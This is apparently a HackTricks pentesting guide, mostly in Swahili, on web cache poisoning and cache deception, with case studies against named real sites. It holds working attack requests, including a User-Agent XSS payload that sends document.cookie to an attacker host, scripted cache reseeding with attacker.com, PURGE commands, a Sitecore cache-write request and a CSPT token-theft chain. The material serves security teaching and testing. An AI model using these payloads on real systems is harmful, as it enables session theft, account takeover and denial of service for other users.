# Cache Poisoning and Cache Deception

{{#include ../../banners/hacktricks-training.md}}

## Tofauti

> **What is the difference between web cache poisoning and web cache deception?**
>
> - In **web cache poisoning**, the attacker causes the application to store some malicious content in the cache, and this content is served from the cache to other application users.
> - In **web cache deception**, the attacker causes the application to store some sensitive content belonging to another user in the cache, and the attacker then retrieves this content from the cache.

## Cache Poisoning

Cache poisoning inalenga kuathiri cache ya upande wa mteja ili kulazimisha wateja kupakia rasilimali ambazo hazitarajiwi, zenye sehemu tu, au zilizo katika udhibiti wa mshambuliaji. Athari yake inategemea umaarufu wa ukurasa ulioathiriwa, kwa kuwa majibu yaliyopotoshwa hutolewa kwa watumiaji wanaotembelea ukurasa huo wakati cache ilikuwa imechafuliwa.

Utekelezaji wa shambulio la cache poisoning unajumuisha hatua kadhaa:

1. **Identification of Unkeyed Inputs**: Hizi ni vigezo ambavyo, ingawa havihitajiki kwa ajili ya kuhifadhiwa mwitikio, vinaweza kubadilisha mwitikio unaorejeshwa na server. Kutambua vigezo hivi ni muhimu kwani vinaweza kutumika kuathiri cache.
2. **Exploitation of the Unkeyed Inputs**: Baada ya kutambua unkeyed inputs, hatua inayofuata ni kubaini jinsi ya kuyatumia vibaya vigezo hivi ili kubadilisha mwitikio wa server kwa njia inayomtumika mshambuliaji.
3. **Ensuring the Poisoned Response is Cached**: Hatua ya mwisho ni kuhakikisha kwamba mwitikio uliodanganywa unawekwa kwenye cache. Kwa njia hii, mtumiaji yeyote anayefungua ukurasa wakati cache imechafuka atapokea mwitikio ulioathiriwa.

### Discovery: Check HTTP headers

Kwa kawaida, wakati mwitikio ulio **hifadhiwa kwenye cache** kutakuwa na **header inayoonyesha hivyo**, unaweza kuangalia headers unazopaswa kuzingatia katika chapisho hiki: [**HTTP Cache headers**](../../network-services-pentesting/pentesting-web/special-http-headers.md#cache-headers).

### Discovery: Caching error codes

Ikiwa unafikiri kwamba mwitikio unahifadhiwa kwenye cache, unaweza kujaribu **kutuma mahitaji yenye header mbaya**, ambayo inapaswa kujibiwa kwa **status code 400**. Kisha jaribu kufungua ombi hilo kawaida na ikiwa **mwitikio ni status code 400**, unajua ni hatarishi (na unaweza hata kufanya DoS).

Unaweza kupata chaguzi zaidi katika:


{{#ref}}
cache-poisoning-to-dos.md
{{#endref}}

Hata hivyo, kumbuka kwamba **wakati mwingine codes za aina hizi hazihifadhiwi kwenye cache** hivyo mtihani huu unaweza kusababisha matokeo yasiyo yaaminika.

### Discovery: Identify and evaluate unkeyed inputs

Unaweza kutumia [**Param Miner**](https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943) ili **brute-force parameters and headers** ambazo zinaweza **kubadilisha mwitikio wa ukurasa**. Kwa mfano, ukurasa unaweza kutumia header `X-Forwarded-For` kuonyesha mteja kupakia script kutoka huko:
```html
<script type="text/javascript" src="//<X-Forwarded-For_value>/resources/js/tracking.js"></script>
```
### Sababisha jibu hatari kutoka kwa back-end server

Mara ya kubaini parameter/header, angalia jinsi inavyosafishwa na wapi inaonekana au inavyoathiri jibu kutoka kwenye header. Je, unaweza kuitumia vibaya (kutekeleza XSS au kupakia JS inayodhibitiwa na wewe? kuanzisha DoS?...)

### Get the response cached

Mara tu utakapobaini **ukurasa** unaoweza kutumiwa, ni **parameter**/**header** gani ya kutumia na **jinsi** ya **kuitumia vibaya**, unahitaji kufanya ukurasa uwekwe kwenye cache. Kulingana na rasilimali unayotaka kuweka kwenye cache hii inaweza kuchukua muda; unaweza kuhitaji kujaribu kwa sekunde kadhaa.

The header **`X-Cache`** in the response could be very useful as it may have the value **`miss`** when the request wasn't cached and the value **`hit`** when it is cached.\
The header **`Cache-Control`** is also interesting to know if a resource is being cached and when will be the next time the resource will be cached again: `Cache-Control: public, max-age=1800`

Header nyingine ya kuvutia ni **`Vary`**. Header hii kwa kiasi kikubwa hutumika kuonyesha **headers za ziada** ambazo zinachukuliwa kama **sehemu ya cache key** hata kama kawaida hazihesabiwi. Kwa hivyo, ikiwa mshambuliaji anajua `User-Agent` ya mwathiriwa anayemlenga, anaweza poison the cache kwa watumiaji wanaotumia `User-Agent` hiyo maalum.

Header nyingine inayohusiana na cache ni **`Age`**. Inaelezea muda kwa sekunde ambao kitu kimekuwa kwenye proxy cache.

Wakati unahifadhi ombi, kuwa **makini na headers unazotumia** kwa sababu baadhi yake zinaweza kutumika kinyume cha matarajio kama **sehemu ya key** na **mwathiriwa atalazimika kutumia header hiyo hiyo**. Daima **jaribu** Cache Poisoning kwa **browsers mbalimbali** ili kuangalia kama inafanya kazi.

### Foundational cache poisoning case studies

#### HackerOne global redirect via `X-Forwarded-Host`

- The origin templated redirects and canonical URLs with `X-Forwarded-Host`, but the cache key only used the `Host` header, so a single response poisoned every visitor to `/`.
- Poison with:
```http
GET / HTTP/1.1
Host: hackerone.com
X-Forwarded-Host: evil.com
```
- Omba mara moja `/` tena bila spoofed header; ikiwa redirect itaendelea una global host-spoofing primitive ambayo mara nyingi hubadilisha reflected redirects/Open Graph links kuwa stored issues.

#### DoS ya repositori ya GitHub kupitia `Content-Type` + `PURGE`

- Trafiki isiyojulikana ilitambulishwa kwa path pekee, wakati backend ilipoingia katika hali ya kosa ilipokiona `Content-Type` isiyotegemewa. Jibu la kosa hilo liliweza kuwekwa kwenye cache kwa kila mtumiaji asiyetambulishwa wa repo.
- GitHub pia (kimakosa) iliheshimu `PURGE` verb, ikimruhusu attacker kuflush a healthy entry na kulazimisha caches kuvuta the poisoned variant kwa mahitaji:
```bash
curl -H "Content-Type: invalid-value" https://github.com/user/repo
curl -X PURGE https://github.com/user/repo
```
- Daima linganisha authenticated vs anonymous cache keys, fuzz headers ambazo kwa kawaida hazina key kama `Content-Type`, na probe kwa exposed cache-maintenance verbs ili automate re-poisoning.

#### Shopify cross-host persistence loops

- Multi-layer caches wakati mwingine zinahitaji multiple identical hits kabla ya ku-commit object mpya. Shopify reused the same cache across numerous localized hosts, hivyo persistence ilimaanisha athari kwa properties nyingi.
- Tumia short automation loops ku-reseed repeatedly:
```python
import requests, time
for i in range(100):
requests.get("https://shop.shopify.com/endpoint",
headers={"X-Forwarded-Host": "attacker.com"})
time.sleep(0.1)
print("attacker.com" in requests.get("https://shop.shopify.com/endpoint").text)
```
- Baada ya jibu la `hit`, chunguza hosts/assets nyingine zinazoshiriki cache namespace ile ile ili kuonyesha cross-domain blast radius.

#### JS asset redirect → stored XSS chain

- Programu binafsi mara nyingi huhifadhi JS iliyoshirikiwa kama `/assets/main.js` katika subdomains kadhaa. Ikiwa `X-Forwarded-Host` inaathiri mantiki ya redirect kwa assets hizo lakini haifungwi kwa ufunguo (unkeyed), jibu lililohifadhiwa kwenye cache linageuka kuwa 301 kuelekea JS ya mshambuliaji, likazalisha stored XSS kila mahali asset hiyo inayoingizwa.
```http
GET /assets/main.js HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com
```
- Bainisha host zinazotumia tena asset path ile ile ili uweze kuthibitisha kuathiriwa kwa subdomain nyingi.

#### GitLab static DoS via `X-HTTP-Method-Override`

- GitLab ilitoa static bundles kutoka Google Cloud Storage, ambayo inaheshimu `X-HTTP-Method-Override`. Kubadilisha GET hadi HEAD kulirudisha cacheable `200 OK` yenye `Content-Length: 0`, na edge cache ilipuuzia mbali HTTP method wakati wa kutengeneza key.
```http
GET /static/app.js HTTP/1.1
Host: gitlab.com
X-HTTP-Method-Override: HEAD
```
- Ombi moja lilibadilisha JS bundle kuwa mwili tupu kwa kila GET, na hivyo kusababisha DoSing ya UI. Daima jaribu method overrides (`X-HTTP-Method-Override`, `X-Method-Override`, etc.) dhidi ya static assets na thibitisha ikiwa cache inabadilika kwa method.

#### Mzunguko wa static asset wa HackerOne kupitia `X-Forwarded-Scheme`

- Rails’ Rack middleware ilitegemea `X-Forwarded-Scheme` kuamua kama italazimisha HTTPS. Kuigiza `http` dhidi ya `/static/logo.png` kilianzisha 301 inayoweza kuwekwa kwa cache hivyo watumiaji wote baadaye walipokea redirects (au loops) badala ya asset:
```http
GET /static/logo.png HTTP/1.1
Host: hackerone.com
X-Forwarded-Scheme: http
```
- Changanya scheme spoofing na host spoofing inapowezekana ili kutengeneza irreversible redirects kwa rasilimali zenye uonekano mkubwa.

#### Cloudflare host-header casing mismatch

- Cloudflare ilinormaliza header ya `Host` kwa ajili ya cache keys lakini ilipeleka casing ya asili kwa origins. Kutuma `Host: TaRgEt.CoM` kilisababisha tabia mbadala katika origin routing/templating huku bado ikijaza cache bucket ya canonical lowercase.
```http
GET / HTTP/1.1
Host: TaRgEt.CoM
```
- Orodhesha CDN tenants kwa replaying mixed-case hosts (na other normalized headers) na diff the cached response versus the origin response ili kugundua shared-platform cache poisonings.

#### Red Hat Open Graph meta poisoning

- Kuingiza `X-Forwarded-Host` ndani ya Open Graph tags kulibadilisha reflected HTML injection kuwa stored XSS mara CDN ilipo-cache ukurasa. Tumia harmless cache buster wakati wa testing ili kuepuka kuathiri production users:
```http
GET /en?dontpoisoneveryone=1 HTTP/1.1
Host: www.redhat.com
X-Forwarded-Host: a."?><script>alert(1)</script>
```
- Social media scrapers hutumia cached Open Graph tags, hivyo single poisoned entry inasambaza payload kwa mbali zaidi kuliko watembeleaji wa moja kwa moja.

## Mifano ya Exploiting Examples

### Mfano rahisi kabisa

Header kama `X-Forwarded-For` inaonekana kwenye jibu bila kusafishwa.\
Unaweza kutuma payload ya msingi ya XSS na poison the cache ili kila mtu anayefikia ukurasa atakuwa XSSed:
```html
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: a."><script>alert(1)</script>"
```
_Kumbuka kwamba hii itachafua ombi la `/en?region=uk` si la `/en`_

### Cache poisoning to DoS


{{#ref}}
cache-poisoning-to-dos.md
{{#endref}}

### Cache poisoning through CDNs

Katika **[this writeup](https://nokline.github.io/bugbounty/2024/02/04/ChatGPT-ATO.html)** imeelezea hali rahisi ifuatayo:

- The CDN itahifadhi chochote chini ya `/share/`
- The CDN haitatafsiri (decode) wala hainormalize `%2F..%2F`, hivyo inaweza kutumiwa kama **path traversal to access other sensitive locations that will be cached** kama `https://chat.openai.com/share/%2F..%2Fapi/auth/session?cachebuster=123`
- Seva ya wavuti itatafsiri (decode) na itanormalize `%2F..%2F`, na itajibu na `/api/auth/session`, ambayo **ina auth token**.

### Using web cache poisoning to exploit cookie-handling vulnerabilities

Cookies pia zinaweza kuonekana kwenye jibu la ukurasa. Ikiwa unaweza kuzitumia kusababisha XSS, kwa mfano, unaweza ku-exploit XSS kwa wateja kadhaa wanapakia malicious cache response.
```html
GET / HTTP/1.1
Host: vulnerable.com
Cookie: session=VftzO7ZtiBj5zNLRAuFpXpSQLjS4lBmU; fehost=asd"%2balert(1)%2b"
```
Kumbuka kwamba ikiwa cookie iliyo dhaifu inatumiwa sana na watumiaji, maombi ya kawaida yataendelea kufuta cache.

### Generating discrepancies with delimiters, normalization and dots <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

Angalia:


{{#ref}}
cache-poisoning-via-url-discrepancies.md
{{#endref}}

### Cache poisoning na path traversal ili kuiba API key <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

[**This writeup explains**](https://nokline.github.io/bugbounty/2024/02/04/ChatGPT-ATO.html) how it was possible to steal an OpenAI API key with an URL like `https://chat.openai.com/share/%2F..%2Fapi/auth/session?cachebuster=123` because anything matching `/share/*` will be cached without Cloudflare normalising the URL, which was done when the request reached the web server.

Hii pia imelezwa vizuri zaidi katika:


{{#ref}}
cache-poisoning-via-url-discrepancies.md
{{#endref}}

### Using multiple headers to exploit web cache poisoning vulnerabilities <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

Wakati mwingine utahitaji **exploit several unkeyed inputs** ili uweze kutumia cache vibaya. Kwa mfano, unaweza kupata an **Open redirect** ikiwa utaweka `X-Forwarded-Host` kwa domain unayodhibiti na `X-Forwarded-Scheme` kuwa `http`. Ikiwa **server** inafanya **forwarding** ya maombi yote ya **HTTP** **kwa HTTPS** na inatumia header `X-Forwarded-Scheme` kama jina la domain kwa redirect, unaweza kudhibiti wapi ukurasa utaelekezwa kwa redirect.
```html
GET /resources/js/tracking.js HTTP/1.1
Host: acc11fe01f16f89c80556c2b0056002e.web-security-academy.net
X-Forwarded-Host: ac8e1f8f1fb1f8cb80586c1d01d500d3.web-security-academy.net/
X-Forwarded-Scheme: http
```
### Exploiting with limited `Vary`header

Ikiwa umegundua kwamba header **`X-Host`** inatumiwa kama **domain name to load a JS resource** lakini header **`Vary`** kwenye response inaonyesha **`User-Agent`**, basi unahitaji kupata njia ya exfiltrate User-Agent ya victim na poison the cache ukitumia user agent hiyo:
```html
GET / HTTP/1.1
Host: vulnerbale.net
User-Agent: THE SPECIAL USER-AGENT OF THE VICTIM
X-Host: attacker.com
```
### Fat Get

Tuma ombi la GET lenye maombi kwenye URL na katika body. Ikiwa web server inatumia ile kutoka body lakini cache server inakasha ile kutoka URL, yeyote anayefikia URL hiyo atatumia parameter kutoka body. Kama vuln James Kettle aligundua kwenye Github website:
```
GET /contact/report-abuse?report=albinowax HTTP/1.1
Host: github.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 22

report=innocent-victim
```
There a lab ya PortSwigger kuhusu hili: [https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-fat-get](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-fat-get)

### Parameter Cloacking

Kwa mfano, inawezekana kutenganisha **parameters** katika server za ruby kwa kutumia tabia **`;`** badala ya **`&`**. Hii inaweza kutumika kuweka thamani za **parameters** zisizo na funguo ndani ya zile zenye funguo na kuzitumia vibaya.

Portswigger lab: [https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking)

### Exploiting HTTP Cache Poisoning by abusing HTTP Request Smuggling

Learn here about how to perform [Cache Poisoning attacks by abusing HTTP Request Smuggling](../http-request-smuggling/index.html#using-http-request-smuggling-to-perform-web-cache-poisoning).

### Automated testing for Web Cache Poisoning

The [Web Cache Vulnerability Scanner](https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner) inaweza kutumika kujaribu kiotomatiki kwa web cache poisoning. Inasaidia mbinu nyingi tofauti na inaweza kubadilishwa sana.

Mfano wa matumizi: `wcvs -u example.com`

### Header-reflection XSS + CDN/WAF-assisted cache seeding (User-Agent, auto-cached .js)

Mfano huu wa ulimwengu halisi unaunganisha primitive ya reflection inayotokana na header na tabia ya CDN/WAF ili kwa uhakika kuathiri cached HTML iliyohifadhiwa na kutumika kwa watumiaji wengine:

- The main HTML reflected an untrusted request header (e.g., `User-Agent`) into executable context.
- The CDN stripped cache headers but an internal/origin cache existed. The CDN also auto-cached requests ending in static extensions (e.g., `.js`), while the WAF applied weaker content inspection to GETs for static assets.
- Request flow quirks allowed a request to a `.js` path to influence the cache key/variant used for the subsequent main HTML, enabling cross-user XSS via header reflection.

Practical recipe (observed across a popular CDN/WAF):

1) From a clean IP (avoid prior reputation-based downgrades), set a malicious `User-Agent` via browser or Burp Proxy Match & Replace.
2) In Burp Repeater, prepare a group of two requests and use "Send group in parallel" (single-packet mode works best):
- First request: GET a `.js` resource path on the same origin while sending your malicious `User-Agent`.
- Immediately after: GET the main page (`/`).
3) The CDN/WAF routing race plus the auto-cached `.js` often seeds a poisoned cached HTML variant that is then served to other visitors sharing the same cache key conditions (e.g., same `Vary` dimensions like `User-Agent`).

Mfano wa payload ya header (kwa kuchukuliwa kwa cookies zisizo za HttpOnly):
```http
User-Agent: Mo00ozilla/5.0</script><script>new Image().src='https://attacker.oastify.com?a='+document.cookie</script>"
```
Vidokezo vya uendeshaji:

- CDNs nyingi zinaficha cache headers; poisoning inaweza kuonekana tu kwa mizunguko ya refresh ya masaa kadhaa. Tumia vantage IPs nyingi na throttle ili kuepuka rate-limit au reputation triggers.
- Kutumia IP kutoka cloud ya CDN yenyewe wakati mwingine huboresha uthabiti wa routing.
- Ikiwa CSP kali iko, hii bado inafanya kazi ikiwa reflection inatekelezwa katika main HTML context na CSP inaruhusu inline execution au inavunjwa na context.

Athari:

- Ikiwa session cookies haziko `HttpOnly`, zero-click ATO inawezekana kwa mass-exfiltrating `document.cookie` kutoka kwa watumiaji wote ambao wanatumiwa poisoned HTML.


### Sitecore pre‑auth HTML cache poisoning (unsafe XAML Ajax reflection)

A Sitecore‑specific pattern enables unauthenticated writes to the HtmlCache by abusing pre‑auth XAML handlers and AjaxScriptManager reflection. When the `Sitecore.Shell.Xaml.WebControl` handler is reached, an `xmlcontrol:GlobalHeader` (inayotokana na `Sitecore.Web.UI.WebControl`) inapatikana na reflective call ifuatayo inaruhusiwa:
```http
POST /-/xaml/Sitecore.Shell.Xaml.WebControl
Content-Type: application/x-www-form-urlencoded

__PARAMETERS=AddToCache("key","<html>…payload…</html>")&__SOURCE=ctl00_ctl00_ctl05_ctl03&__ISEVENT=1
```
Hii inaandika HTML yoyote chini ya cache key inayochaguliwa na mshambuliaji, ikiruhusu cache poisoning sahihi mara cache keys zinapojulikana.

For full details (cache key construction, ItemService enumeration and a chained post‑auth deserialization RCE):

{{#ref}}
../../network-services-pentesting/pentesting-web/sitecore/README.md
{{#endref}}

## Mifano Yenye Udhaifu

### Apache Traffic Server ([CVE-2021-27577](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-27577))

ATS ilisafirisha fragment ndani ya URL bila kuiondoa na ikatengeneza cache key kwa kutumia tu host, path na query (ikipuuzia fragment). Kwa hivyo ombi `/#/../?r=javascript:alert(1)` lilitumwa kwa backend kama `/#/../?r=javascript:alert(1)` na cache key hakuwa na payload ndani yake, bali tu host, path na query.

### 403 na Storage Buckets

Cloudflare hapo awali ili-cache majibu ya 403. Kujaribu kufikia S3 au Azure Storage Blobs kwa Authorization headers zisizo sahihi kungesababisha majibu ya 403 ambayo yange-cache. Ingawa Cloudflare imeacha ku-cache majibu ya 403, tabia hii inaweza bado kuwepo katika proxy services nyingine.

### Kuingiza Vigezo Vyenye Key

Caches mara nyingi hujumuisha vigezo maalum vya GET katika cache key. Kwa mfano, Varnish ya Fastly ili-cache parameter ya `size` katika maombi. Hata hivyo, ikiwa toleo lililotumwa kwa URL-encoding la parameter (kwa mfano, `siz%65`) lilitumwa pia na thamani isiyo sahihi, cache key ingejengwa kwa kutumia parameter sahihi ya `size`. Lakini, backend ingeshughulikia thamani inayoonekana katika parameter iliyokuwa URL-encoded. Kuweka kwa URL-encoding parameter ya pili ya `size` kulifanya itokwe na cache lakini itumike na backend. Kumpa thamani ya 0 parameter hii ilisababisha kosa la 400 Bad Request ambalo lingeweza ku-cache.

### User Agent Rules

Watekelezaji wengine huzuia maombi yaliyo na user-agents zinazolingana na zana zenye trafiki nyingi kama FFUF au Nuclei ili kudhibiti mzigo wa server. Kwa kejeli, njia hii inaweza kuanzisha udhaifu kama cache poisoning na DoS.

### Vichwa vya Header Visivyo Halali

The [RFC7230](https://datatracker.ietf.mrg/doc/html/rfc7230) specifies the acceptable characters in header names. Headers containing characters outside of the specified **tchar** range should ideally trigger a 400 Bad Request response. In practice, servers don't always adhere to this standard. A notable example is Akamai, which forwards headers with invalid characters and caches any 400 error, as long as the `cache-control` header is not present. An exploitable pattern was identified where sending a header with an illegal character, such as `\`, would result in a cacheable 400 Bad Request error.

### Kutafuta vichwa vipya

[https://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6](https://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6)

## Cache Deception

The goal of Cache Deception is to make clients **load resources that are going to be saved by the cache with their sensitive information**.

Kabla ya yote kumbuka kwamba **extensions** kama `.css`, `.js`, `.png` n.k. kwa kawaida huwa **configured** kuhifadhiwa katika **cache.** Kwa hivyo, ikiwa utafikia `www.example.com/profile.php/nonexistent.js` cache ina uwezekano mkubwa wa kuhifadhi response kwa sababu inaona `.js` **extension**. Lakini, ikiwa **application** inarejea na maudhui ya mtumiaji yaliyo nyeti yaliyohifadhiwa katika _www.example.com/profile.php_, unaweza **kuiba** yale maudhui kutoka kwa watumiaji wengine.

Mambo mengine ya kujaribu:

- _www.example.com/profile.php/.js_
- _www.example.com/profile.php/.css_
- _www.example.com/profile.php/test.js_
- _www.example.com/profile.php/../test.js_
- _www.example.com/profile.php/%2e%2e/test.js_
- _Use lesser known extensions such as_ `.avif`

Another very clear example can be found in this write-up: [https://hackerone.com/reports/593712](https://hackerone.com/reports/593712).\
Katika mfano huo, imelezwa kwamba ikiwa utaweka ukurasa usiokuwepo kama _http://www.example.com/home.php/non-existent.css_ maudhui ya _http://www.example.com/home.php_ (**yenye taarifa nyeti za mtumiaji**) yatarudishwa na server na server ya cache itahifadhi matokeo.\
Kisha, **mshambuliaji** anaweza kufikia _http://www.example.com/home.php/non-existent.css_ katika browser yao wenyewe na kuona taarifa za **kificho** za watumiaji waliotembelea kabla.

Kumbuka kwamba **cache proxy** inapaswa kuwa **configured** ku-cache faili **kulingana** na **extension** ya faili (_.css_) na si kuzingatia content-type. Katika mfano _http://www.example.com/home.php/non-existent.css_ itakuwa na content-type ya `text/html` badala ya `text/css` mime type.

Jifunze hapa jinsi ya kutekeleza[ Cache Deceptions attacks abusing HTTP Request Smuggling](../http-request-smuggling/index.html#using-http-request-smuggling-to-perform-web-cache-deception).

### CSPT-assisted authenticated cache poisoning (Account Takeover)

This pattern combines a Client-Side Path Traversal (CSPT) primitive in a Single-Page App (SPA) with extension-based CDN caching to publicly cache sensitive JSON that was originally only available via an authenticated API call.

Wazo kwa ujumla:

- Endpoint nyeti ya API inahitaji auth header maalum na imetajwa kwa usahihi kama isiyofaa ku-cache kwenye origin.
- Kuongeza suffix inayofanana na static (kwa mfano, .css) kunafanya CDN itafate path kama asset statiki na ku-cache response, mara nyingi bila kuvary juu ya headers nyeti.
- SPA ina CSPT: inaunganisha segmenti ya path iliyo chini ya udhibiti wa mtumiaji ndani ya URL ya API wakati ikiongeza auth header ya mwathiriwa (kwa mfano, X-Auth-Token). Kwa kuingiza ../.. traversal, fetch iliyothibitishwa inarudishwa kwenye variant ya path inayoweza ku-cache (…/v1/token.css), ikasababisha CDN ku-cache token JSON ya mwathiriwa chini ya cache key ya umma.
- Basi mtu yeyote anaweza GET cache key ile ile bila authentication na kupata token ya mwathiriwa.

Example

- Sensitive endpoint (non-cacheable at origin):
```
GET /v1/token HTTP/1.1
Host: api.example.com
X-Auth-Token: <REDACTED>
Accept: application/json

HTTP/1.1 200 OK
Content-Type: application/json
Cache-Control: no-cache, no-store, must-revalidate
X-Cache: Miss from cdn

{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."}
```
- Suffix inayoonekana static hubadilisha CDN kuwa inayoweza kuhifadhiwa kwenye cache:
```
GET /v1/token.css HTTP/1.1
Host: api.example.com
X-Auth-Token: <REDACTED>
Accept: application/json

HTTP/1.1 200 OK
Content-Type: application/json
Cache-Control: max-age=86400, public
X-Cache: Hit from cdn

{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."}
```
- CSPT katika SPA inaambatisha auth header na inaruhusu traversal:
```js
const urlParams = new URLSearchParams(window.location.search);
const userId = urlParams.get('userId');

const apiUrl = `https://api.example.com/v1/users/info/${userId}`;

fetch(apiUrl, {
method: 'GET',
headers: { 'X-Auth-Token': authToken }
});
```
- Exploit chain:
1. Vutia mwathiriwa kwenye URL inayobandika dot-segments kwenye parameter ya path ya SPA, kwa mfano:
- [https://example.com/user?userId=../../../v1/token.css](https://example.com/user?userId=../../../v1/token.css)
2. SPA inatuma fetch iliyoidhinishwa kwa:
- [https://api.example.com/v1/users/info/../../../v1/token.css](https://api.example.com/v1/users/info/../../../v1/token.css)
3. Normalization ya browser inaiweka kuwa:
- [https://api.example.com/v1/token.css](https://api.example.com/v1/token.css)
4. CDN huchukulia .css kama asset ya static na huhifadhi (cache) JSON kwa Cache-Control: public, max-age=...
5. Upokezaji wa umma: mtu yeyote anaweza kisha GET https://api.example.com/v1/token.css na kupata JSON ya token iliyohifadhiwa kwenye cache.

Preconditions

- SPA inafanya fetch/XHR iliyoidhinishwa kwenda kwenye origin ya API hiyo hiyo (au cross-origin ikiwa CORS inafanya kazi) na inaambatisha sensitive headers au bearer tokens.
- Edge/CDN inatekeleza extension-based caching kwa njia zinazofanana na static (mf., *.css, *.js, images) na haitofautisha cache key kwa sensitive header.
- Origin ya endpoint ya msingi haifanyi cache (sahihi), lakini toleo lenye extension linaruhusiwa au halizuizwi na kanuni za edge.

Validation checklist

- Tambua sensitive dynamic endpoints na jaribu suffixes kama .css, .js, .jpg, .json. Angalia Cache-Control: public/max-age na X-Cache: Hit (au sawa, mfano CF-Cache-Status) wakati yaliyomo bado ni JSON.
- Tafuta client code inayochanganya user-controlled input ndani ya API paths huku ikiongeza auth headers. Ingiza ../ sequences ili kuredirect ombi lililoidhinishwa kwenda endpoint unalolenga.
- Thibitisha kuwa header iliyoidhinishwa ipo kwenye ombi lililoretargeted (mf., kwenye proxy au kwa kupitia server-side logs) na kwamba CDN inahifadhi response chini ya njia iliyofuatwa.
- Kutoka kwenye muktadha safi (bila auth), omba njia ile ile na thibitisha kuwa secret JSON inatolewa kutoka cache.

## Automatic Tools

- [**toxicache**](https://github.com/xhzeem/toxicache): Skena ya Golang kutafuta web cache poisoning vulnerabilities katika orodha ya URLs na kupima mbinu mbalimbali za injection.

## References

- [https://portswigger.net/web-security/web-cache-poisoning](https://portswigger.net/web-security/web-cache-poisoning)
- [https://portswigger.net/web-security/web-cache-poisoning/exploiting#using-web-cache-poisoning-to-exploit-cookie-handling-vulnerabilities](https://portswigger.net/web-security/web-cache-poisoning/exploiting#using-web-cache-poisoning-to-exploit-cookie-handling-vulnerabilities)
- [https://hackerone.com/reports/593712](https://hackerone.com/reports/593712)
- [https://youst.in/posts/cache-poisoning-at-scale/](https://youst.in/posts/cache-poisoning-at-scale/)
- [https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9](https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9)
- [https://www.linkedin.com/pulse/how-i-hacked-all-zendesk-sites-265000-site-one-line-abdalhfaz/](https://www.linkedin.com/pulse/how-i-hacked-all-zendesk-sites-265000-site-one-line-abdalhfaz/)
- [How I found a 0-Click Account takeover in a public BBP and leveraged it to access Admin-Level functionalities](https://hesar101.github.io/posts/How-I-found-a-0-Click-Account-takeover-in-a-public-BBP-and-leveraged-It-to-access-Admin-Level-functionalities/)
- [Burp Proxy Match & Replace](https://portswigger.net/burp/documentation/desktop/tools/proxy/match-and-replace)
- [watchTowr Labs – Sitecore XP cache poisoning → RCE](https://labs.watchtowr.com/cache-me-if-you-can-sitecore-experience-platform-cache-poisoning-to-rce/)
- [Cache Deception + CSPT: Turning Non Impactful Findings into Account Takeover](https://zere.es/posts/cache-deception-cspt-account-takeover/)
- [CSPT overview by Matan Berson](https://matanber.com/blog/cspt-levels/)
- [CSPT presentation by Maxence Schmitt](https://www.youtube.com/watch?v=O1ZN_OCfNzg)
- [PortSwigger: Web Cache Deception](https://portswigger.net/web-security/web-cache-deception)
- [Cache Poisoning Case Studies Part 1: Foundational Attacks Behind a $100K+ Vulnerability Class](https://herish.me/blog/cache-poisoning-case-studies-part-1-foundational-attacks/)



{{#include ../../banners/hacktricks-training.md}}
